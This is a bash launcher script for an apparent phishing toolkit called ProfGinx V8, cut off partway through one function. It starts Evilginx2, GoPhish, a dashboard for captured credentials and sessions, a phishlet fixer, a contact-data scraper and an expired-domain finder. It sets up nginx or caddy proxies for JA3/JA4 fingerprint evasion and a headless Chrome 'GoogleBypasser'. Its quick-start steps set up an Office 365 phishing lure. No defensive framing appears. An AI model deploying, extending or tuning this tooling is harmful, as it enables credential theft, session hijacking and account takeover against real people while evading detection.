#!/bin/bash

# ProfGinx V8 - Service Runner Script
# Starts Evilginx2, EvilFeed Dashboard, and GoPhish services

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# tmux session name
TMUX_SESSION="profginx"

# Reverse proxy settings
REVERSE_PROXY=""
REVERSE_PROXY_DOMAIN=""

clear

echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    PROFGINX V8 SUITE                         ║${NC}"
echo -e "${CYAN}║     Evilginx2 + EvilFeed Dashboard + GoPhish Integration     ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# HELPER FUNCTIONS
# ============================================

check_binary() {
    local binary="$1"
    local path="$2"

    if [[ ! -f "$path" ]]; then
        echo -e "${RED}❌ $binary binary not found!${NC}"
        echo "Run: ./setup.sh build"
        return 1
    fi
    return 0
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${RED}⚠️  Root permissions required (for ports 80/443)${NC}"
        echo "Run with: sudo ./start.sh $1"
        exit 1
    fi
}

check_tmux() {
    if ! command -v tmux &> /dev/null; then
        echo -e "${RED}❌ tmux is required to run all services${NC}"
        echo "Install with: brew install tmux (macOS) or apt install tmux (Linux)"
        exit 1
    fi
}

# ============================================
# SERVICE INFO
# ============================================

show_info() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📋 ProfGinx V8 Suite Components:${NC}"
    echo ""
    echo -e "${GREEN}1. Evilginx2${NC} - Main phishing framework"
    echo "   • Ports: 80, 443 (requires root)"
    echo "   • Config: ./.evilginx/"
    echo ""
    echo -e "${GREEN}2. EvilFeed Dashboard${NC} - Real-time event monitoring"
    echo "   • URL: http://<server_ip>:1337"
    echo "   • Features: Live map, credentials view, session tracking"
    echo ""
    echo -e "${GREEN}3. GoPhish${NC} - Campaign management (optional)"
    echo "   • Admin: https://<server_ip>:3333"
    echo "   • Phish Server: 127.0.0.1:8080"
    echo ""
    echo -e "${GREEN}4. PhishCreator${NC} - Phishlet analyzer & fixer"
    echo "   • URL: http://<server_ip>:5050"
    echo "   • Features: YAML analysis, HAR comparison, auto-fix"
    echo ""
    echo -e "${GREEN}5. GMaps Scraper${NC} - Google Maps business data scraper"
    echo "   • URL: http://<server_ip>:8081"
    echo "   • Features: Local scraping or API mode, phone/email extraction, CSV export"
    echo ""
    echo -e "${GREEN}6. DomainHunterPro${NC} - Expired domain finder"
    echo "   • URL: http://<server_ip>:3000"
    echo "   • Features: Find expired domains, check availability, SEO metrics"
    echo ""
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}🔐 Default Credentials:${NC}"
    echo ""
    echo -e "${YELLOW}EvilFeed Dashboard:${NC}"
    echo "   URL: http://<server_ip>:1337"
    echo "   Username: admin"
    echo -e "   Password: ${GREEN}Auto-generated on first run${NC}"
    echo ""
    echo -e "${YELLOW}GoPhish:${NC}"
    echo "   URL: https://<server_ip>:3333"
    echo "   Username: admin"
    echo -e "   Password: ${GREEN}Auto-generated on first run${NC}"
    echo ""
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}🚀 Quick Start Commands (in Evilginx2):${NC}"
    echo ""
    echo "  1. config domain your-domain.com"
    echo "  2. config ip your-server-ip"
    echo "  3. phishlets hostname 0365 office.your-domain.com"
    echo "  4. phishlets enable 0365"
    echo "  5. lures create 0365"
    echo "  6. lures get-url 0"
    echo ""
    echo -e "${CYAN}🔗 EvilFeed Integration:${NC}"
    echo "  > evilfeed enable"
    echo "  > evilfeed status"
    echo "  > evilfeed test"
    echo ""
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
}

show_usage() {
    echo -e "${BLUE}Usage:${NC} ./start.sh [command] [options]"
    echo ""
    echo -e "${YELLOW}Commands:${NC}"
    echo "  run [flags]    - Start Evilginx2 only (requires root)"
    echo "  evilfeed       - Start EvilFeed dashboard only"
    echo "  gophish        - Start GoPhish server only"
    echo "  phishletweb    - Start PhishCreator analyzer only"
    echo "  gmapscraper    - Start GMaps Scraper only"
    echo "  domainhunter   - Start DomainHunterPro only"
    echo "  all [flags]    - Start all services in tmux (requires root)"
    echo "  status         - Show running services status"
    echo "  stop           - Stop all services and tmux session"
    echo "  info           - Show service information"
    echo "  help           - Show this help message"
    echo ""
    echo -e "${YELLOW}Custom Service Combination:${NC}"
    echo "  You can launch specific services together by listing them:"
    echo "  sudo ./start.sh <service1> <service2> ... [flags]"
    echo ""
    echo "  Available services: evilginx, evilfeed, gophish, phishletweb, gmapscraper, domainhunter"
    echo ""
    echo -e "${YELLOW}Evilginx2 Flags (for run/all/custom commands):${NC}"
    echo "  -feed          - Auto-enable EvilFeed integration in Evilginx config"
    echo "  -g <path>      - Path to GoPhish database file"
    echo "  -c <path>      - Configuration directory path"
    echo "  -debug         - Enable debug output"
    echo ""
    echo -e "${YELLOW}Reverse Proxy (JA3/JA4 Evasion):${NC}"
    echo "  -reverse nginx <domain>  - Start with nginx reverse proxy"
    echo "  -reverse caddy <domain>  - Start with caddy reverse proxy"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  sudo ./start.sh run                    # Start Evilginx2"
    echo "  sudo ./start.sh run -feed              # Start with EvilFeed enabled"
    echo "  sudo ./start.sh run -reverse nginx evil.com"
    echo "                                         # Start with nginx for JA3/JA4 evasion"
    echo "  sudo ./start.sh run -reverse caddy evil.com"
    echo "                                         # Start with caddy for JA3/JA4 evasion"
    echo "  sudo ./start.sh all                    # Start all services in tmux"
    echo "  sudo ./start.sh all -feed              # All services with EvilFeed"
    echo "  ./start.sh evilfeed                    # Start EvilFeed only"
    echo "  ./start.sh gophish                     # Start GoPhish only"
    echo "  ./start.sh phishletweb                 # Start PhishCreator only"
    echo "  ./start.sh gmapscraper                 # Start GMaps Scraper only"
    echo "  ./start.sh domainhunter                # Start DomainHunterPro only"
    echo "  ./start.sh status                      # Check service status"
    echo "  sudo ./start.sh stop                   # Stop all services"
    echo ""
    echo -e "${YELLOW}Custom Combination Examples:${NC}"
    echo "  sudo ./start.sh evilginx evilfeed gophish -feed"
    echo "                                         # Evilginx + EvilFeed + GoPhish with -feed flag"
    echo "  sudo ./start.sh evilginx gophish       # Evilginx + GoPhish only"
    echo "  ./start.sh evilfeed gmapscraper        # EvilFeed + GMaps Scraper (no root needed)"
    echo ""
}

# ============================================
# CHROME FOR GOOGLEBYPASSER
# ============================================

start_chrome_headless() {
    echo -e "${CYAN}🌐 Starting Chrome for GoogleBypasser...${NC}"

    # Check if Chrome is already running on port 9222
    if pgrep -f "remote-debugging-port=9222" > /dev/null 2>&1; then
        echo -e "${GREEN}  ✅ Chrome already running on port 9222${NC}"
        return 0
    fi

    # Find Chrome binary
    local CHROME_BIN=""
    if command -v google-chrome &> /dev/null; then
        CHROME_BIN="google-chrome"
    elif command -v google-chrome-stable &> /dev/null; then
        CHROME_BIN="google-chrome-stable"
    elif command -v chromium-browser &> /dev/null; then
        CHROME_BIN="chromium-browser"
    elif command -v chromium &> /dev/null; then
        CHROME_BIN="chromium"
    fi

    if [[ -z "$CHROME_BIN" ]]; then
        echo -e "${RED}  ❌ Chrome/Chromium not found!${NC}"
        echo -e "${YELLOW}     GoogleBypasser will not work.${NC}"
        echo -e "${YELLOW}     Run: sudo ./setup.sh full${NC}"
        return 1
    fi

    # Start Chrome in headless mode with remote debugging
    # --no-sandbox is required when running as root
    echo -e "${CYAN}  Starting $CHROME_BIN in headless mode...${NC}"
    nohup $CHROME_BIN \
        --headless \
        --disable-gpu \
        --no-sandbox \
        --disable-dev-shm-usage \
        --remote-debugging-port=9222 \
        --remote-debugging-address=127.0.0.1 \
        --disable-background-networking \
        --disable-default-apps \
        --disable-extensions \
        --disable-sync \
        --disable-translate \
        --hide-scrollbars \
        --metrics-recording-only \
        --mute-audio \
        --no-first-run \
        --safebrowsing-disable-auto-update \
        > /tmp/chrome-headless.log 2>&1 &

    # Wait for Chrome to start
    sleep 2

    # Verify Chrome is running
    if pgrep -f "remote-debugging-port=9222" > /dev/null 2>&1; then
        echo -e "${GREEN}  ✅ Chrome headless started on port 9222${NC}"
        return 0
    else
        echo -e "${RED}  ❌ Failed to start Chrome headless${NC}"
        echo -e "${YELLOW}     Check /tmp/chrome-headless.log for errors${NC}"
        return 1
    fi
}

stop_chrome_headless() {
    if pgrep -f "remote-debugging-port=9222" > /dev/null 2>&1; then
        echo -e "${YELLOW}[*]${NC} Stopping Chrome headless..."
        pkill -f "remote-debugging-port=9222" 2>/dev/null
        echo -e "${GREEN}[+]${NC} Chrome headless stopped"
    fi
}

# ============================================
# REVERSE PROXY FOR JA3/JA4 EVASION
# ============================================

start_reverse_proxy() {
    local proxy_type="$1"
    local domain="$2"
    
    if [[ -z "$domain" ]]; then
        echo -e "${RED}❌ Domain required for reverse proxy${NC}"
        echo "Usage: ./start.sh run -reverse nginx yourdomain.com"
        exit 1
    fi
    
    echo -e "${CYAN}🔒 Setting up $proxy_type reverse proxy for JA3/JA4 evasion...${NC}"
    echo -e "${CYAN}   Domain: $domain${NC}"
    echo ""
    
    case "$proxy_type" in
        nginx)
            start_nginx_proxy "$domain"
            ;;
        caddy)
            start_caddy_proxy "$domain"
            ;;
        *)
            echo -e "${RED}❌ Unknown proxy type: $proxy_type${NC}"
            echo "Supported: nginx, caddy"
            exit 1
            ;;
    esac
}

# Disable Evilginx autocert when using reverse proxy (nginx/caddy handles SSL)
disable_evilginx_autocert() {
    local CONFIG_DIR="$SCRIPT_DIR/.evilginx"
    local CONFIG_FILE="$CONFIG_DIR/config.json"
    
    mkdir -p "$CONFIG_DIR"
    
    if [[ -f "$CONFIG_FILE" ]]; then
        # Update existing config to disable autocert
        if command -v python3 &> /dev/null; then
            python3 << EOF
import json
try:
    with open('$CONFIG_FILE', 'r') as f:
        config = json.load(f)
    
    # Ensure general section exists
    if 'general' not in config:
        config['general'] = {}
    
    # Disable autocert - nginx/caddy handles SSL
    config['general']['autocert'] = False
    
    with open('$CONFIG_FILE', 'w') as f:
        json.dump(config, f, indent=2)
    print('Autocert disabled in Evilginx config')
except Exception as e:
    print(f'Warning: Could not update config: {e}')
EOF
        else
            # Fallback: use jq if available
            if command -v jq &> /dev/null; then
                local tmp_file=$(mktemp)
                jq '.general.autocert = false' "$CONFIG_FILE" > "$tmp_file" && mv "$tmp_file" "$CONFIG_FILE"
            fi
        fi
    else
        # Create new config with autocert disabled
        cat > "$CONFIG_FILE" << EOF
{
  "general": {
    "autocert": false
  }
}
EOF
    fi
    
    echo -e "${CYAN}   Disabled Evilginx autocert (nginx/caddy handles SSL)${NC}"
}

start_nginx_proxy() {
    local domain="$1"
    
    # Create marker files for EvilFeed auto-detection
    mkdir -p "$HOME/.evilgophish"
    echo "8443" > "$HOME/.evilgophish/evilginx_port"
    echo "8888" > "$HOME/.evilgophish/internal_api_port"
    echo -e "${CYAN}   Created port markers for EvilFeed auto-detection${NC}"
    
    # Disable Evilginx autocert - nginx will handle SSL
    disable_evilginx_autocert
    
    # Check if nginx is installed
    if ! command -v nginx &> /dev/null; then
        echo -e "${YELLOW}⚠️  Nginx not installed. Installing...${NC}"
        if command -v apt-get &> /dev/null; then
            apt-get update -qq && apt-get install -y nginx
        elif command -v yum &> /dev/null; then
            yum install -y nginx
        elif command -v brew &> /dev/null; then
            brew install nginx
        else
            echo -e "${RED}❌ Cannot install nginx automatically. Please install manually.${NC}"
            exit 1
        fi
    fi
    
    # Create SSL directory
    mkdir -p /etc/nginx/ssl
    
    # Generate self-signed cert if not exists
    if [[ ! -f "/etc/nginx/ssl/evilginx.crt" ]]; then
        echo -e "${CYAN}   Generating self-signed certificate...${NC}"
        openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
            -keyout "/etc/nginx/ssl/evilginx.key" \
            -out "/etc/nginx/ssl/evilginx.crt" \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=*.$domain" \
            2>/dev/null
        echo -e "${GREEN}   ✅ Certificate generated${NC}"
    fi
    
    # Copy and configure nginx config
    local nginx_conf="/etc/nginx/sites-available/evilginx"
    cp "$SCRIPT_DIR/reverse_proxy/nginx.conf" "$nginx_conf"
    
    # Update domain in config (macOS compatible sed)
    if [[ "$(uname)" == "Darwin" ]]; then
        sed -i '' "s/DOMAIN_NAME/$domain/g" "$nginx_conf"
    else
        sed -i "s/DOMAIN_NAME/$domain/g" "$nginx_conf"
    fi
    
    # Create sites-enabled if not exists
    mkdir -p /etc/nginx/sites-enabled
    
    # Enable site
    ln -sf "$nginx_conf" /etc/nginx/sites-enabled/evilginx
    
    # Remove default site if exists
    rm -f /etc/nginx/sites-enabled/default
    
    # Test nginx config
    if nginx -t 2>/dev/null; then
        echo -e "${GREEN}   ✅ Nginx configuration valid${NC}"
    else
        echo -e "${RED}   ❌ Nginx configuration invalid${NC}"
        nginx -t
        exit 1
    fi
    
    # Start/restart nginx
    if systemctl is-active --quiet nginx 2>/dev/null; then
        systemctl reload nginx
        echo -e "${GREEN}   ✅ Nginx reloaded${NC}"
    elif command -v systemctl &> /dev/null; then
        systemctl enable nginx 2>/dev/null
        systemctl start nginx
        echo -e "${GREEN}   ✅ Nginx started${NC}"
    else
        # macOS or non-systemd
        nginx -s reload 2>/dev/null || nginx
        echo -e "${GREEN}   ✅ Nginx started${NC}"
    fi
    
    echo ""
    echo -e "${GREEN}✅ Nginx reverse proxy configured!${NC}"
    echo -e "${CYAN}   Nginx handles port 443 (TLS termination)${NC}"
    echo -e "${CYAN}   Evilginx will run on port 8443 (localhost)${NC}"
    echo ""
    
    REVERSE_PROXY="nginx"
    REVERSE_PROXY_DOMAIN="$domain"
}

start_caddy_proxy() {
    local domain="$1"
    
    # Create marker file for EvilFeed auto-detection
    mkdir -p "$HOME/.evilgophish"
    echo "8443" > "$HOME/.evilgophish/evilginx_port"
    echo -e "${CYAN}   Created port marker for EvilFeed auto-detection${NC}"
    
    # Disable Evilginx autocert - caddy will handle SSL
    disable_evilginx_autocert
    
    # Check if caddy is installed
    if ! command -v caddy &> /dev/null; then
        echo -e "${YELLOW}⚠️  Caddy not installed. Installing...${NC}"
        if command -v apt-get &> /dev/null; then
            apt-get update -qq
            apt-get install -y debian-keyring debian-archive-keyring apt-transport-https curl
            curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg 2>/dev/null
            curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | tee /etc/apt/sources.list.d/caddy-stable.list > /dev/null
            apt-get update -qq && apt-get install -y caddy
        elif command -v yum &> /dev/null; then
            yum install -y yum-plugin-copr 2>/dev/null || dnf install -y dnf-plugins-core 2>/dev/null
            yum copr enable @caddy/caddy -y 2>/dev/null || dnf copr enable @caddy/caddy -y 2>/dev/null
            yum install -y caddy 2>/dev/null || dnf install -y caddy 2>/dev/null
        elif command -v brew &> /dev/null; then
            brew install caddy
        else
            echo -e "${RED}❌ Cannot install caddy automatically. Please install manually.${NC}"
            exit 1
        fi
    fi
    
    # Create caddy config directory
    mkdir -p /etc/caddy
    
    # Copy and configure Caddyfile
    local caddyfile="/etc/caddy/Caddyfile"
    cp "$SCRIPT_DIR/reverse_proxy/Caddyfile" "$caddyfile"
    
    # Update domain in config (macOS compatible sed)
    if [[ "$(uname)" == "Darwin" ]]; then
        sed -i '' "s/DOMAIN_NAME/$domain/g" "$caddyfile"
    else
        sed -i "s/DOMAIN_NAME/$domain/g" "$caddyfile"
    fi
    
    # Create log directory
    mkdir -p /var/log/caddy
    
    # Validate config
    if caddy validate --config "$caddyfile" 2>/dev/null; then
        echo -e "${GREEN}   ✅ Caddy configuration valid${NC}"
    else
        echo -e "${RED}   ❌ Caddy configuration invalid${NC}"
        caddy validate --config "$caddyfile"
        exit 1
    fi
    
    # Start/restart caddy
    if systemctl is-active --quiet caddy 2>/dev/null; then
        systemctl reload caddy
        echo -e "${GREEN}   ✅ Caddy reloaded${NC}"
    elif command -v systemctl &> /dev/null; then
        systemctl enable caddy 2>/dev/null
        systemctl start caddy
        echo -e "${GREEN}   ✅ Caddy started${NC}"
    else
        # macOS or non-systemd
        caddy stop 2>/dev/null
        caddy start --config "$caddyfile" &
        echo -e "${GREEN}   ✅ Caddy started${NC}"
    fi
    
    echo ""
    echo -e "${GREEN}✅ Caddy reverse proxy configured!${NC}"
    echo -e "${CYAN}   Caddy handles port 443 (auto SSL)${NC}"
    echo -e "${CYAN}   Evilginx will run on port 8443 (localhost)${NC}"
    echo ""
    
    REVERSE_PROXY="caddy"
    REVERSE_PROXY_DOMAIN="$domain"
}

stop_reverse_proxy() {
    echo -e "${YELLOW}[*]${NC} Stopping reverse proxy..."
    
    # Remove port marker file (EvilFeed will auto-detect port 443 again)
    rm -f "$HOME/.evilgophish/evilginx_port" 2>/dev/null
    
    # Stop nginx
    if systemctl is-active --quiet nginx 2>/dev/null; then
        systemctl stop nginx
        echo -e "${GREEN}[+]${NC} Nginx stopped"
    elif pgrep -x nginx > /dev/null 2>&1; then
        nginx -s stop 2>/dev/null
        echo -e "${GREEN}[+]${NC} Nginx stopped"
    fi
    
    # Stop caddy
    if systemctl is-active --quiet caddy 2>/dev/null; then
        systemctl stop caddy
        echo -e "${GREEN}[+]${NC} Caddy stopped"
    elif pgrep -x caddy > /dev/null 2>&1; then
        caddy stop 2>/dev/null
        echo -e "${GREEN}[+]${NC} Caddy stopped"
    fi
}

# ============================================
# GOPHISH AUTO-CONFIGURATION
# ============================================

# Auto-configure GoPhish integration in Evilginx config
auto_configure_gophish() {
    local CONFIG_DIR="$SCRIPT_DIR/.evilginx"
    local CONFIG_FILE="$CONFIG_DIR/config.json"
    local GOPHISH_LOG="$SCRIPT_DIR/gophish/gophish.log"
    local GOPHISH_DB="$SCRIPT_DIR/gophish/gophish.db"
    
    echo -e "${CYAN}🔗 Auto-configuring GoPhish integration...${NC}"
    
    # Create config directory if not exists
    mkdir -p "$CONFIG_DIR"
    
    # Check if GoPhish binary exists
    if [[ ! -f "$SCRIPT_DIR/gophish/gophish" ]]; then
        echo -e "${YELLOW}   ⚠️  GoPhish binary not found, skipping auto-config${NC}"
        return 1
    fi
    
    # Try to get API key from gophish.log
    local API_KEY=""
    if [[ -f "$GOPHISH_LOG" ]]; then
        # Look for API key in log - use sed for macOS compatibility (grep -P not available)
        API_KEY=$(grep -E 'api_key' "$GOPHISH_LOG" 2>/dev/null | sed -E 's/.*api_key[":[:space:]]+([a-zA-Z0-9]+).*/\1/' | tail -1)
    fi
    
    # If no API key found in log, try to get from database
    if [[ -z "$API_KEY" && -f "$GOPHISH_DB" ]]; then
        if command -v sqlite3 &> /dev/null; then
            API_KEY=$(sqlite3 "$GOPHISH_DB" "SELECT api_key FROM users WHERE username='admin' LIMIT 1;" 2>/dev/null)
        fi
    fi
    
    # Default GoPhish URL (localhost since running on same server)
    local GOPHISH_URL="https://127.0.0.1:3333"
    
    # Check if config file exists and update it
    if [[ -f "$CONFIG_FILE" ]]; then
        # Check if gophish config already exists
        if grep -q '"gophish"' "$CONFIG_FILE" 2>/dev/null; then
            echo -e "${GREEN}   ✅ GoPhish config already exists in Evilginx config${NC}"
            
            # Update API key if we found one and it's different
            if [[ -n "$API_KEY" ]]; then
                local CURRENT_KEY=$(grep -oP '"api_key"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null)
                if [[ "$CURRENT_KEY" != "$API_KEY" && -n "$CURRENT_KEY" ]]; then
                    echo -e "${CYAN}   Updating API key...${NC}"
                    if [[ "$(uname)" == "Darwin" ]]; then
                        sed -i '' "s/\"api_key\"\s*:\s*\"[^\"]*\"/\"api_key\": \"$API_KEY\"/" "$CONFIG_FILE"
                    else
                        sed -i "s/\"api_key\"\s*:\s*\"[^\"]*\"/\"api_key\": \"$API_KEY\"/" "$CONFIG_FILE"
                    fi
                fi
            fi
        else
            # Add gophish config to existing config file
            echo -e "${CYAN}   Adding GoPhish config to Evilginx...${NC}"
            
            # Create gophish config block
            local GOPHISH_CONFIG='"gophish": {"admin_url": "'$GOPHISH_URL'", "api_key": "'$API_KEY'", "insecure": true, "db_path": "'$GOPHISH_DB'"}'
            
            # Insert before the last closing brace using Python (more reliable than sed for JSON)
            if command -v python3 &> /dev/null; then
                python3 << EOF
import json
try:
    with open('$CONFIG_FILE', 'r') as f:
        config = json.load(f)
    config['gophish'] = {
        'admin_url': '$GOPHISH_URL',
        'api_key': '$API_KEY',
        'insecure': True,
        'db_path': '$GOPHISH_DB'
    }
    with open('$CONFIG_FILE', 'w') as f:
        json.dump(config, f, indent=2)
    print('GoPhish config added successfully')
except Exception as e:
    print(f'Error: {e}')
EOF
            else
                echo -e "${YELLOW}   ⚠️  Python3 not found, manual config required${NC}"
            fi
        fi
    else
        # Create new config file with gophish settings
        echo -e "${CYAN}   Creating new config with GoPhish settings...${NC}"
        cat > "$CONFIG_FILE" << EOF
{
  "gophish": {
    "admin_url": "$GOPHISH_URL",
    "api_key": "$API_KEY",
    "insecure": true,
    "db_path": "$GOPHISH_DB"
  }
}
EOF
    fi
    
    # Also update EvilFeed's gophish_db_path setting
    local EVILFEED_DB="$SCRIPT_DIR/evilfeed/nexusfeed.db"
    if [[ -f "$EVILFEED_DB" ]] && command -v sqlite3 &> /dev/null; then
        sqlite3 "$EVILFEED_DB" "INSERT OR REPLACE INTO settings (key, value) VALUES ('gophish_db_path', '$GOPHISH_DB');" 2>/dev/null
        echo -e "${GREEN}   ✅ EvilFeed GoPhish DB path configured${NC}"
    fi
    
    if [[ -n "$API_KEY" ]]; then
        echo -e "${GREEN}   ✅ GoPhish auto-configured:${NC}"
        echo -e "${CYAN}      URL: $GOPHISH_URL${NC}"
        echo -e "${CYAN}      API Key: ${API_KEY:0:8}...${NC}"
        echo -e "${CYAN}      DB Path: $GOPHISH_DB${NC}"
    else
        echo -e "${YELLOW}   ⚠️  GoPhish URL configured, but API key not found${NC}"
        echo -e "${YELLOW}      Start GoPhish first, then run again to auto-detect API key${NC}"
        echo -e "${YELLOW}      Or manually set: config gophish api_key <key>${NC}"
    fi
    
    return 0
}

# Extract GoPhish API key from running instance or database
get_gophish_api_key() {
    local GOPHISH_LOG="$SCRIPT_DIR/gophish/gophish.log"
    local GOPHISH_DB="$SCRIPT_DIR/gophish/gophish.db"
    
    # Try log file first
    if [[ -f "$GOPHISH_LOG" ]]; then
        local KEY=$(grep -oP 'api_key["\s:]+\K[a-zA-Z0-9]+' "$GOPHISH_LOG" 2>/dev/null | tail -1)
        if [[ -n "$KEY" ]]; then
            echo "$KEY"
            return 0
        fi
    fi
    
    # Try database
    if [[ -f "$GOPHISH_DB" ]] && command -v sqlite3 &> /dev/null; then
        local KEY=$(sqlite3 "$GOPHISH_DB" "SELECT api_key FROM users WHERE username='admin' LIMIT 1;" 2>/dev/null)
        if [[ -n "$KEY" ]]; then
            echo "$KEY"
            return 0
        fi
    fi
    
    return 1
}

# ============================================
# SERVICE RUNNERS
# ============================================

run_evilginx() {
    check_root "run"
    check_binary "evilginx2" "$SCRIPT_DIR/evilginx2" || exit 1

    echo -e "${GREEN}✅ Running as root${NC}"
    echo ""

    # Parse arguments for -reverse flag
    shift  # Skip 'run' command
    local EXTRA_FLAGS=""
    local USE_REVERSE_PROXY=""
    local REVERSE_DOMAIN=""
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -reverse)
                USE_REVERSE_PROXY="$2"
                REVERSE_DOMAIN="$3"
                shift 3
                ;;
            *)
                EXTRA_FLAGS="$EXTRA_FLAGS $1"
                shift
                ;;
        esac
    done

    # Start Chrome headless for GoogleBypasser
    start_chrome_headless
    echo ""

    # Start reverse proxy if requested
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        start_reverse_proxy "$USE_REVERSE_PROXY" "$REVERSE_DOMAIN"
        # Add port flag for evilginx to run on 8443
        EXTRA_FLAGS="$EXTRA_FLAGS -p 8443"
    fi

    show_info

    echo -e "${YELLOW}⚠️  Press Ctrl+C to stop Evilginx2${NC}"
    echo ""

    echo -e "${GREEN}🔥 Starting Evilginx2...${NC}"
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        echo -e "${CYAN}   Reverse Proxy: $USE_REVERSE_PROXY (domain: $REVERSE_DOMAIN)${NC}"
        echo -e "${CYAN}   Evilginx Port: 8443 (behind $USE_REVERSE_PROXY)${NC}"
    fi
    if [[ -n "$EXTRA_FLAGS" ]]; then
        echo -e "${CYAN}   Flags:$EXTRA_FLAGS${NC}"
    fi
    echo ""

    ./evilginx2 -c ./.evilginx $EXTRA_FLAGS
}

run_evilfeed() {
    check_binary "evilfeed" "$SCRIPT_DIR/evilfeed/evilfeed" || exit 1

    echo -e "${GREEN}🔥 Starting EvilFeed Dashboard...${NC}"
    echo -e "${CYAN}   URL: http://<server_ip>:1337${NC}"
    echo ""
    echo -e "${YELLOW}📝 First Run: Watch for auto-generated password below!${NC}"
    echo -e "${YELLOW}   Username: admin${NC}"
    echo ""

    cd "$SCRIPT_DIR/evilfeed" && ./evilfeed
}

run_gophish() {
    check_binary "gophish" "$SCRIPT_DIR/gophish/gophish" || exit 1

    # Generate certs if needed
    if [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.crt" ]] || [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.key" ]]; then
        echo -e "${YELLOW}📜 Generating SSL certificates for GoPhish...${NC}"
        openssl req -x509 -newkey rsa:2048 \
            -keyout "$SCRIPT_DIR/gophish/gophish_admin.key" \
            -out "$SCRIPT_DIR/gophish/gophish_admin.crt" \
            -days 365 -nodes -subj "/CN=gophish" 2>/dev/null
        echo -e "${GREEN}  ✅ Certificates generated${NC}"
        echo ""
    fi

    echo -e "${GREEN}🔥 Starting GoPhish...${NC}"
    echo -e "${CYAN}   Admin URL: https://<server_ip>:3333${NC}"
    echo ""
    echo -e "${YELLOW}📝 First Run: Watch for auto-generated password below!${NC}"
    echo -e "${YELLOW}   Username: admin${NC}"
    echo ""

    cd "$SCRIPT_DIR/gophish" && ./gophish
}

run_phishletweb() {
    local PHISHLET_WEB_DIR="$SCRIPT_DIR/phishcreator"

    if [[ ! -f "$PHISHLET_WEB_DIR/app.py" ]]; then
        echo -e "${RED}❌ PhishCreator not found!${NC}"
        echo "The phishcreator directory is missing app.py"
        return 1
    fi

    if [[ ! -d "$PHISHLET_WEB_DIR/venv" ]]; then
        echo -e "${RED}❌ Python venv not found!${NC}"
        echo "Run: sudo ./setup.sh full"
        return 1
    fi

    echo -e "${GREEN}🔥 Starting PhishCreator...${NC}"
    echo -e "${CYAN}   URL: http://<server_ip>:5050${NC}"
    echo ""
    echo -e "${YELLOW}📝 Phishlet analyzer and fixer tool${NC}"
    echo ""

    cd "$PHISHLET_WEB_DIR"
    source venv/bin/activate
    PLAYWRIGHT_BROWSERS_PATH="$PHISHLET_WEB_DIR/.playwright" python app.py
}

run_gmapscraper() {
    local GMAPS_DIR="$SCRIPT_DIR/gmapscraper"

    if [[ ! -f "$GMAPS_DIR/gmapscraper" ]]; then
        echo -e "${YELLOW}⚠️  GMaps Scraper binary not found, building...${NC}"
        cd "$GMAPS_DIR"
        if ! go build -o gmapscraper . 2>/dev/null; then
            echo -e "${RED}❌ Failed to build GMaps Scraper!${NC}"
            echo "Make sure Go is installed and run: cd gmapscraper && go build -o gmapscraper ."
            return 1
        fi
        echo -e "${GREEN}  ✅ Build successful${NC}"
    fi

    echo -e "${GREEN}🔥 Starting GMaps Scraper...${NC}"
    echo -e "${CYAN}   URL: http://<server_ip>:8081${NC}"
    echo ""
    echo -e "${YELLOW}📝 Google Maps data extraction tool${NC}"
    echo -e "${YELLOW}   - Local scraping with Playwright${NC}"
    echo -e "${YELLOW}   - Commercial API mode support${NC}"
    echo -e "${YELLOW}   - Phone/Email extraction with US formats${NC}"
    echo -e "${YELLOW}   - CSV upload and export${NC}"
    echo ""

    cd "$GMAPS_DIR"
    ./gmapscraper -web -addr :8081
}

run_domainhunter() {
    local DOMAINHUNTER_DIR="$SCRIPT_DIR/domainhunterpro"

    if [[ ! -d "$DOMAINHUNTER_DIR" ]]; then
        echo -e "${RED}❌ DomainHunterPro not found!${NC}"
        echo "The domainhunterpro directory is missing"
        return 1
    fi

    if [[ ! -d "$DOMAINHUNTER_DIR/node_modules" ]]; then
        echo -e "${YELLOW}⚠️  DomainHunterPro not setup, installing dependencies...${NC}"
        cd "$DOMAINHUNTER_DIR"
        if ! pnpm install 2>/dev/null; then
            echo -e "${RED}❌ Failed to install dependencies!${NC}"
            echo "Make sure Node.js and pnpm are installed"
            return 1
        fi
        echo -e "${GREEN}  ✅ Dependencies installed${NC}"
    fi

    cd "$DOMAINHUNTER_DIR"

    # Check if better-sqlite3 native module is built
    if ! find node_modules -name "better_sqlite3.node" 2>/dev/null | grep -q .; then
        echo -e "${YELLOW}⚠️  Native modules not built, building better-sqlite3...${NC}"

        # Find better-sqlite3 directory and build directly
        local SQLITE_DIR=$(find node_modules/.pnpm -type d -name "better-sqlite3" -path "*better-sqlite3@*/node_modules/*" 2>/dev/null | head -1)
        if [[ -n "$SQLITE_DIR" && -d "$SQLITE_DIR" ]]; then
            cd "$SQLITE_DIR"
            npm run build-release 2>&1 || npx node-gyp rebuild 2>&1 || {
                echo -e "${RED}❌ Failed to build better-sqlite3!${NC}"
                echo "Try manually: cd $SQLITE_DIR && npm run build-release"
                return 1
            }
